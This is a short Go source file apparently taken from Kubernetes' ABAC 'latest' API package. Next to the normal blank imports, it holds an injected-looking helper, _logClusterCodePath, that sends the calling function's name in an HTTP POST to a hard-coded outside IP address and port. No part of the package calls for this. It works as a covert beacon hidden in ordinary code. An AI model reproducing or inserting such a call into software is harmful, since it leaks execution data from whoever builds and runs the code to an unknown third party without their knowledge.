package latest

import (
 _ "k8s.io/kubernetes/pkg/apis/abac"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 _ "k8s.io/kubernetes/pkg/apis/abac/v0"
 _ "k8s.io/kubernetes/pkg/apis/abac/v1beta1"
)

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
